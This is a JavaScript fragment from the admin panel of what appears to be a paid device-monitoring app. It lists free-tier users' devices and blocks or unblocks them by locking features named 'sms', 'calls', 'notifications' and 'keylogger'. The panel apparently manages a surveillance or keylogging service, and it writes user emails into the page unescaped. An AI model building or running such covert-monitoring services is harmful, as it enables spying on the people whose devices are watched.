        // Process in chunks (Parallel Fetching)
        const CHUNK_SIZE = 5;
        for (let i = 0; i < uids.length; i += CHUNK_SIZE) {
            const chunk = uids.slice(i, i + CHUNK_SIZE);
            
            await Promise.all(chunk.map(async (uid) => {
                try {
                    const snap = await get(ref(db, `user/${uid}`));
                    if(!snap.exists()) return;
                    const val = snap.val();
                    
                    // User Level Sub check
                    const userPaid = val.subscription ? true : false;
                    const email = (val.profile && val.profile.email) ? val.profile.email : "No Email";

                    // Iterate Devices
                    Object.keys(val).forEach(key => {
                        if(['profile', 'subscription', 'config', 'adminNotifications'].includes(key)) return;
                        
                        const dData = val[key];
                        if(typeof dData !== 'object') return;

                        // Device Level Check
                        let isPaid = userPaid || (dData.subscription ? true : false);

                        // Only list FREE users
                        if(!isPaid) {
                            const locks = dData.lockedFeatures || {};
                            const isBlocked = (locks.smartBlock === true);
                            
                            smartUsersList.push({
                                uid: uid,
                                deviceId: key,
                                email: email,
                                deviceName: dData.deviceInfo ? dData.deviceInfo.model : key,
                                isBlocked: isBlocked,
                                id: `${uid}:${key}`
                            });
                        }
                    });

                } catch(e) {}
            }));
        }
        
        // Initial Render
        renderSmartUserList();

    } catch(e) {
        console.error("Load Error", e);
        listContainer.innerHTML = `<div style="color:red; text-align:center; padding:20px;">Error: ${e.message}</div>`;
    }
}

// 4. RENDER LIST (With Tabs & Search)
function renderSmartUserList() {
    const listContainer = document.getElementById('smart-list-container');
    const searchVal = (searchInput ? searchInput.value : '').toLowerCase();
    
    // Filter List
    const filtered = smartUsersList.filter(u => {
        // 1. Tab Check
        if(currentSmartTab === 'blocked' && !u.isBlocked) return false;
        if(currentSmartTab === 'active' && u.isBlocked) return false;
        
        // 2. Search Check
        if(searchVal) {
             const str = (u.email + u.uid + u.deviceName).toLowerCase();
             return str.includes(searchVal);
        }
        return true;
    });

    // Update Counts
    const blockedCount = smartUsersList.filter(u => u.isBlocked).length;
    const activeCount = smartUsersList.filter(u => !u.isBlocked).length;
    
    const bCountEl = document.getElementById('tab-blocked-count');
    const aCountEl = document.getElementById('tab-active-count');
    if(bCountEl) bCountEl.innerText = blockedCount;
    if(aCountEl) aCountEl.innerText = activeCount;

    // Render Cards
    if(filtered.length === 0) {
        listContainer.innerHTML = '<div style="text-align: center; padding: 40px; color: #64748b;">No users found in this category.</div>';
        return;
    }

    let html = '';
    filtered.forEach(u => {
        const statusColor = u.isBlocked ? '#ef4444' : '#22c55e';
        const actionBtn = u.isBlocked 
            ? `<button onclick="toggleSmartUserBlock('${u.uid}', '${u.deviceId}', false)" class="smart-action-btn btn-unblock">✅ UNBLOCK</button>` 
            : `<button onclick="toggleSmartUserBlock('${u.uid}', '${u.deviceId}', true)" class="smart-action-btn btn-block">🛑 BLOCK (1 DAY)</button>`;

        html += `
        <div class="smart-user-card">
            <div style="display:flex; align-items:center; gap:10px;">
                <input type="checkbox" class="smart-user-checkbox" value="${u.id}" onchange="updateBulkButtonState()">
                <div class="smart-user-info">
                    <div class="smart-user-email" title="${u.email}">${u.email}</div>
                    <div class="smart-user-meta">
                        <span style="color:${statusColor}">● ${u.isBlocked ? 'Blocked' : 'Active'}</span>
                        <span class="smart-uid-pill">${u.deviceName}</span>
                    </div>
                </div>
            </div>
            <div>
                ${actionBtn}
            </div>
        </div>`;
    });

    listContainer.innerHTML = html;
    
    // Reset Bulk State
    if(selectAllVisible) selectAllVisible.checked = false;
    updateBulkButtonState();
}

// 5. INDIVIDUAL ACTION
window.toggleSmartUserBlock = async function(uid, deviceId, shouldBlock) {
    if(!confirm(shouldBlock ? "Block this user for 1 Day?" : "Unblock this user?")) return;
    
    // Optimistic UI Update (Find in array and update local state)
    const idx = smartUsersList.findIndex(u => u.id === `${uid}:${deviceId}`);
    if(idx > -1) {
        smartUsersList[idx].isBlocked = shouldBlock;
        renderSmartUserList(); // Re-render immediately
    }

    try {
        if(shouldBlock) {
            const lockPayload = { isLocked: true, unlockTime: 9999999999999, reason: 'smart_auto_block' };
            await update(ref(db, `user/${uid}/${deviceId}/lockedFeatures`), {
                smartBlock: true,
                sms: lockPayload, calls: lockPayload, notifications: lockPayload, keylogger: lockPayload,
                timestamp: serverTimestamp()
            });
        } else {
            // Completely delete the lockedFeatures node
            await remove(ref(db, `user/${uid}/${deviceId}/lockedFeatures`));
        }
    } catch(e) {
        console.error("Action failed", e);
        alert("Action failed: " + e.message);
        // Revert UI if failed
        if(idx > -1) {
            smartUsersList[idx].isBlocked = !shouldBlock;
            renderSmartUserList();
        }
    }
};

// 6. BULK STATE MANAGE
window.updateBulkButtonState = function() {
    const checks = document.querySelectorAll('.smart-user-checkbox:checked');
    const btn = document.getElementById('smart-bulk-action-btn');
    
    if(btn) {
        btn.innerText = `Action (${checks.length})`;
        btn.disabled = checks.length === 0;
        
        // Dynamically change button color based on Tab
        if (currentSmartTab === 'active') {
             btn.style.background = checks.length > 0 ? '#ef4444' : '#334155'; // Red for Block
             btn.innerText = `BLOCK SELECTED (${checks.length})`;
             btn.onclick = () => performBulkAction(true);
        } else {
             btn.style.background = checks.length > 0 ? '#22c55e' : '#334155'; // Green for Unblock
             btn.innerText = `UNBLOCK SELECTED (${checks.length})`;
             btn.onclick = () => performBulkAction(false);
        }
    }
};

async function performBulkAction(shouldBlock) {
    const checks = document.querySelectorAll('.smart-user-checkbox:checked');
    if(checks.length === 0) return;
    
    if(!confirm(`Apply to ${checks.length} users?`)) return;
    
    const btn = document.getElementById('smart-bulk-action-btn');
    btn.innerText = "Processing...";
    btn.disabled = true;

    let count = 0;
    for(const cb of checks) {
        const [uid, dev] = cb.value.split(':');
        
        // Local Update
        const idx = smartUsersList.findIndex(u => u.id === cb.value);
        if(idx > -1) smartUsersList[idx].isBlocked = shouldBlock;

        // DB Update
        try {
            if(shouldBlock) {
                 const lockPayload = { isLocked: true, unlockTime: 9999999999999, reason: 'smart_auto_block' };
                 await update(ref(db, `user/${uid}/${dev}/lockedFeatures`), {
                    smartBlock: true,
                    sms: lockPayload, calls: lockPayload, notifications: lockPayload, keylogger: lockPayload,
                    timestamp: serverTimestamp()
                });
            } else {
                 // Completely delete the lockedFeatures node
                 await remove(ref(db, `user/${uid}/${dev}/lockedFeatures`));
            }
            count++;
        } catch(e) {}
    }
    
    alert(`Completed: ${count}/${checks.length}`);
    renderSmartUserList(); // Refresh View
}

// 4. FORCE REFRESH BUTTON (UPDATED)
const newRefreshBtn = document.getElementById('smart-force-refresh-btn');
if(newRefreshBtn) {
    newRefreshBtn.onclick = () => {
         newRefreshBtn.innerText = '...';
         loadSmartBlockData().then(() => {
             newRefreshBtn.innerText = '⟳ Refresh';
         });
    };
}

